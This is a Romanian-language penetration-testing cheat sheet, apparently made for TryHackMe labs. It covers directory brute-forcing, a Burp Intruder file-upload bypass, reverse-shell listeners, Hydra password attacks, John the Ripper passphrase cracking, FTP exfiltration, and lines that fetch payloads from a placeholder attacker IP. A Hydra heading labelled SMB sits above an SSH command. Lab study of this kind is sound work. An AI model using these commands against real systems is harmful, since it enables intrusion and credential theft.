# Cybersecurity & Web Reconnaissance Tools

Ghiduri de referință, comenzi rapide și metodologii de scanare/investigație folosite în evaluarea securității sistemelor și a aplicațiilor web.

---

## 1. Utilitarul `dirb` (Directory & Content Busting)

`dirb` este un scanner de securitate web bazat pe dicționare (*wordlists*). Acesta trimite automat cereri HTTP GET către un server țintă pentru a identifica directoare ascunse, pagini de administrare și fișiere sensibile nespecificate public.

### Sintaxă de Bază
```bash
dirb http://<IP_SAU_DOMENIU>/
```

Exemplu simplu:
```bash
dirb [http://10.10.10.10/](http://10.10.10.10/)
```

---

### Opțiuni și Flag-uri Frecvente

* **Scanare cu un dicționar specific (Wordlist custom):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) /usr/share/wordlists/dirb/big.txt
  ```

* **Căutare după extensii specifice de fișiere (`-X`):**
  Adaugă extensiile la fiecare termen testat (esențial pentru scripturi și backup-uri):
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -X .php,.txt,.html,.bak
  ```

* **Ignorarea anumitor coduri de răspuns HTTP (`-N`):**
  Ascunde codurile de eroare care poluează ecranul:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -N 403
  ```

* **Salvarea rezultatelor într-un fișier text (`-o`):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -o scan_results.txt
  ```

* **Scanare non-interactivă / Silent (`-w`):**
  Nu oprește scanarea la avertismente generice ale serverului:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -w
  ```

---

## 2. Gobuster

Utilitar rapid scris în Go pentru brute-forcing pe componente web (directoare, fișiere, subdomenii, vhosts). Mult mai rapid decât `dirb` datorită execuției concurente (goroutines).

### Sintaxă de bază (Directory Enumeration)
```bash
gobuster dir -u <URL> -w <WORDLIST>
```
---

### Gobuster Flags

| Flag | Descriere | Exemplu |
| :--- | :--- | :--- |
| `dir` | Modul de căutare directoare și fișiere web | `gobuster dir` |
| `-u` | URL-ul complet al țintei (protocol + host + port) | `-u http://10.10.x.x:3333` |
| `-w` | Calea către fișierul de tip wordlist | `-w /usr/share/wordlists/dirb/common.txt` |
| `-x` | Extensii de fișiere căutate (separate prin virgulă) | `-x php,html,txt` |
| `-t` | Număr de thread-uri concurente (viteză, default: 10) | `-t 50` |
| `-e` | Afișează URL-ul complet în terminal | `-e` |
| `-k` | Ignoră verificarea certificatelor SSL (HTTPS invalid) | `-k` |
| `-o` | Salvează rezultatele într-un fișier text | `-o scan_results.txt` |
| `-s` | Coduri de status HTTP acceptate (whitelist) | `-s "200,204,301,302,307"` |
| `-b` | Coduri de status HTTP ignorate (blacklist) | `-b "403,404"` |
| `-U` | Username pentru HTTP Basic Authentication | `-U admin` |
| `-P` | Parolă pentru HTTP Basic Authentication | `-P secret123` |
| `-c` | Cookie transmis în header-ul fiecărui request | `-c "PHPSESSID=xyz123"` |
| `-p` | Proxy prin care rutezi cererile (ex: Burp Suite) | `-p http://127.0.0.1:8080` |
| `-z` | Nu afișează bara de progres (reduce output-ul) | `-z` |

---


## 3. BurpSuite

Platformă integrată pentru testarea securității aplicațiilor web. Funcționează ca un proxy HTTP/HTTPS de tip Man-in-the-Middle (MitM) între browser și serverul țintă, permițând interceptarea, inspectarea, modificarea și automatizarea cererilor.

### Module principale

| Modul | Rol principal | Scenariu de utilizare |
| :--- | :--- | :--- |
| **Proxy** | Interceptează traficul HTTP/HTTPS în timp real | Modificarea parametrilor din formulare, headere, cookie-uri înainte de a ajunge pe server |
| **Repeater** | Retrimite cereri individuale modificate manual | Testare rapidă pentru SQLi, XSS, bypass-uri de logare fără a reîncărca pagina în browser |
| **Intruder** | Automatizează atacuri personalizate și fuzzing | Brute-force pe parole/directoare, testare de extensii de fișiere (file upload bypass), IDOR |
| **Target** | Maparea structurii site-ului (Site Map) | Vizualizarea arborelui complet de endpoint-uri, directoare și parametri descoperiți |
| **Decoder** | Encodare/decodare rapidă de date | URL encoding, Base64, Hex, HTML entities direct în GUI |

---

### Tipuri de atac în Intruder

* **Sniper:** Folosește un singur set de payload-uri. Dacă sunt marcate mai multe poziții (`§...§`), le testează pe rând, pe fiecare poziție independent.
* **Battering Ram:** Folosește un singur set de payload-uri, dar inserează **aceeași valoare** în toate pozițiile marcate simultan la fiecare request.
* **Pitchfork:** Folosește seturi diferite de payload-uri pentru fiecare poziție, iterând prin liste în paralel (linie cu linie: payload1 din lista A cu payload1 din lista B).
* **Cluster Bomb:** Folosește seturi diferite de payload-uri pentru fiecare poziție și testează **toate permutările posibile** (produs cartezian, ideal pentru username + password brute-force).

---

### Workflow rapid: File Upload Extension Bypass (Intruder)

1. **Setare Proxy:** În browser (Firefox în Kali), navighează prin proxy (`127.0.0.1:8080` sau extensia FoxyProxy).
2. **Interceptare:** În Burp $\rightarrow$ tab-ul **Proxy** $\rightarrow$ asigură-te că butonul arată `Intercept is on`.
3. **Upload de test:** Încarcă un fișier din browser. În Burp va apărea cererea `POST /cale/upload`.
4. **Trimitere la Intruder:** Click dreapta în cerere $\rightarrow$ **Send to Intruder** (sau `Ctrl + I`).
5. **Setare poziție (Tab-ul Positions):**
   * Selectează modul de atac: **Sniper**.
   * Apasă butonul **Clear §**.
   * Evidențiază doar extensia fișierului în header-ul cererii (ex: `filename="shell§.php§"`) și apasă **Add §**.
6. **Setare payload (Tab-ul Payloads):**
   * Payload type: **Simple list**.
   * Încarcă un dicționar cu extensii (ex: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`).
7. **Execuție și analiză:**
   * Apasă **Start Attack**.
   * Sortează rezultatele după coloana **Length** sau **Status** pentru a identifica răspunsurile care deviază de la eroarea clasică (indică acceptarea fișierului pe server).

---

## 4. Reverse Shell

Tehnică prin care o mașină țintă compromisă inițiază o conexiune de rețea ieșită (outbound) înapoi către mașina atacatorului, oferindu-i acestuia o linie de comandă interactivă (shell).

### Reverse Shell vs. Bind Shell

| Tip Shell | Cine ascultă (Listener) | Cine inițiază conexiunea | Avantaj / Caz de utilizare |
| :--- | :--- | :--- | :--- |
| **Reverse Shell** | Atacatorul (`nc -lvnp <port>`) | Ținta (prin payload/script) | Trece ușor de firewall-urile țintei (traficul outbound este de obicei permis) |
| **Bind Shell** | Ținta deschide un port local | Atacatorul se conectează la IP-ul țintei | Util dacă atacatorul nu are IP rutabil direct sau dacă conexiunile outbound sunt blocate strict |

---

### Componentele unui Reverse Shell

1. **Listener-ul (pe mașina ta - Kali):**
   Un utilitar de rețea (de regulă `netcat`) configurat să aștepte pasiv conexiunea:
   ```bash
   nc -lvnp 1234

---


## 🔍 5. Enumerare Servicii de Rețea

### enum4linux
Utilizat pentru scanarea și enumerarea detaliată a serviciilor **SMB/Samba** (porturile 139/445) pe sisteme Windows și Linux. Este ideal pentru extragerea numelor de utilizatori și a mapelor partajate.

* **Comandă completă (cu salvare în log):**
  ```bash
  enum4linux -a 10.112.162.101 | tee enum4linux.log
  ```
* **Opțiuni cheie:**
  * `-a` (All): Rulează toate testele de enumerare posibile (utilizatori, grupuri, share-uri, politici).
  * `| tee <fișier>`: Afișează rezultatul în terminal și îl salvează simultan într-un fișier text pentru analiză ulterioară.

---

## 💣 6. Atacuri prin Forță Brută (Brute Forcing)

### Hydra
Unul dintre cele mai rapide și flexibile instrumente pentru spargerea credențialelor (username/parolă) pe diverse protocoale (SSH, SMB, FTP, HTTP Form).

* **Atac pe serviciul SMB (Rețea):**
  Dacă ai aflat un username din `enum4linux`, folosește:
  ```bash
  hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<IP_TINTA>
  ```

* **Atac pe formulare Web (HTTP-POST):**
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_TINTA> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username" -V
  ```
* **Opțiuni cheie:**
  * `-l` / `-L`: Transmite un singur utilizator (litera mică) sau o listă de utilizatori dintr-un fișier (litera mare).
  * `-p` / `-P`: Transmite o singură parolă (litera mică) sau o listă de parole / wordlist (litera mare).
  * `-V` (Verbose): Afișează în timp real fiecare combinație testată.

---

## 📦 7. Transfer de Fișiere în Laborator

### Python HTTP Server (Sursa)
Cea mai rapidă metodă de a transforma mașina de atac într-un server web temporar pentru a livra scripturi sau payload-uri.
```bash
python3 -m http.server 8000
```

### Metode de descărcare pe mașina țintă
* **Cu Wget:** `wget http://<IP_ATACATOR>:8000/fisier.ext`
* **Cu Curl:** `curl http://<IP_ATACATOR>:8000/fisier.ext -o fisier.ext`

### SCP (Secure Copy)
Folosit pentru a copia fișiere și directoare întregi în siguranță între mașina de atac și serverul țintă, utilizând conexiunea SSH existentă.

* **Comanda de bază (Pentru a descărca un folder întreg de pe server pe Kali):**
  ```bash
  scp -r <username>@<IP_TINTA>:/cale/catre/folder_server /cale/destinatie/local_kali
  ```

* **Comanda de bază (Pentru a urca un fișier de pe Kali pe server):**
  ```bash
  scp /cale/fisier_local <username>@<IP_TINTA>:/cale/destinatie/server
  ```

#### ⚙️ Flag-uri utilizate:
* `-r` : Copiază recursiv (obligatoriu dacă vrei să transferi directoare întregi cu tot cu fișierele din ele).

#### ⚠️ Depanare: Conexiune respinsă pe mașini vechi (Legacy Systems)
Dacă mașina de laborator este învechită, este foarte probabil ca utilitarul `scp` modern de pe Kali să refuze conexiunea cu eroarea: *„no matching host key type found. Their offer: ssh-rsa”*. 

Pentru a debloca transferul, forțează activarea algoritmilor criptografici legacy adăugând manual următoarele opțiuni:

```bash
scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r <username>@<IP_TINTA>:/cale/server /cale/local/
```

---

## 🤖 8. Scripturi de Enumerare Automată (Post-Exploatare)

Aceste unelte sunt colecții de comenzi Bash automate care auditează sistemul local pentru a găsi vectori de Privilege Escalation.

* **`linpeas.sh`**: Cel mai avansat script; caută configurări greșite generalizate. Textul **roșu pe fundal galben** indică o vulnerabilitate aproape sigură.
* **`lse.sh` (Linux Smart Enumeration)**: Filtrează rezultatele în funcție de nivelul de detalii dorit (opțiunea `-l 0` arată doar erorile critice).
* **`LinEnum.sh`**: Unealtă clasică și foarte stabilă pentru un sumar curat al drepturilor Sudo și SUID.

---

## 🔑 9. Conectarea prin SSH cu Cheie Privată

Atunci când ai obținut o cheie privată (ex: `root_key` sau `id_rsa`), o poți folosi pentru a obține acces direct pe server fără a mai introduce o parolă de utilizator.

* **Comanda de bază:**
  ```bash
  ssh -i /cale/catre/cheie_privata username@<IP_TINTA>
  ```

#### ⚙️ Pași Obligatorii și Flag-uri:
1. **Modificarea permisiunilor (Critic):** Înainte de conectare, fișierul cheii trebuie restricționat. Dacă permisiunile sunt prea deschise, clientul SSH va refuza execuția din motive de securitate:
   ```bash
   chmod 600 /cale/catre/cheie_privata
   ```
2. `-i` : Specifică fișierul de identitate (cheia privată).

#### ⚠️ Depanare: Conexiune pe mașini vechi (Legacy Systems)
Dacă serverul de laborator este învechit, clienții SSH moderni de pe Kali vor bloca conexiunea din cauza algoritmilor criptografici depășiți (`ssh-rsa`). Pentru a forța compatibilitatea, adaugă manual acești parametri:

```bash
ssh -i /cale/catre/cheie_privata -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa username@<IP_TINTA>
```

---

## 🔨 10. Spargerea Parolelor Cheilor SSH (SSH Passphrase Cracking)

Dacă încerci să folosești cheia privată și sistemul îți solicită o parolă (*passphrase*), înseamnă că acea cheie este criptată. Putem sparge această parolă offline folosind **John the Ripper**.

Deoarece John nu poate citi direct fișierul cheii, atacul se realizează în doi pași:

### Pasul 1: Conversia cheii în Hash (`ssh2john`)
Transformăm cheia privată într-un format text (hash) pe care John îl poate procesa:
```bash
python3 /usr/share/john/ssh2john.py root_key > cheie.hash
```
*(Notă: Pe unele sisteme comanda globală poate fi apelată direct prin `ssh2john root_key > cheie.hash`)*.

### Pasul 2: Atacul de tip Dicționar cu John
Rulăm procesul de brute-force offline folosind lista clasică de parole `rockyou.txt`:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt cheie.hash
```

### Pasul 3: Afișarea parolei identificate
Dacă John a găsit o potrivire în dicționar, poți revedea parola extrasă oricând rulând:
```bash
john --show cheie.hash
```

---

---

## 📂 11. Extragerea de Date prin FTP (File Transfer Protocol)

Protocolul FTP (portul implicit 21) este utilizat frecvent în laboratoare pentru exfiltrarea sau descărcarea de fișiere de pe mașina țintă.

* **Conectarea de bază la serverul FTP:**
  ```bash
  ftp <IP_TINTA>
  ```
  *Sistemul va solicita introducerea unui username și a unei parole.*

* **Descărcarea unui singur fișier (După ce te-ai conectat):**
  ```ftp
  get nume_fișier.extensie
  ```

* **Descărcarea mai multor fișiere simultan (Multi-get):**
  ```ftp
  mget *
  ```

#### ⚙️ Comenzi interne esențiale în prompt-ul FTP:
* `ls` / `dir` : Listează fișierele și directoarele disponibile pe serverul FTP.
* `cd <director>` : Schimbă folderul curent de pe server.
* `binary` : Comandă extrem de importantă rulată înainte de descărcare pentru a forța transferul în mod binar (asigură că imaginile, arhivele sau binarele executabile nu se corup în timpul transferului).
* `ascii` : Schimbă modul de transfer pentru fișiere text simple (modul implicit).
* `prompt` : Dezactivează confirmarea interactivă (Yes/No) pentru fiecare fișier în parte atunci când folosești `mget *`.
* `exit` / `quit` : Închide sesiunea FTP și te întoarce în terminalul Linux.

#### 💡 Trucuri utile în laboratoarele TryHackMe:
1. **Autentificarea Anonimă (Anonymous Login):** Multe servere FTP configurate greșit în laboratoare permit logarea fără cont valid. Când sistemul îți cere username, scrie `anonymous` sau `ftp`, iar la parolă apasă pur și simplu **Enter** (lasă gol).
2. **Unde ajung fișierele?** Fișierele descărcate prin comanda `get` sau `mget` vor apărea local în folderul de pe mașina ta Kali **din care ai rulat comanda inițială** `ftp <IP_TINTA>`.



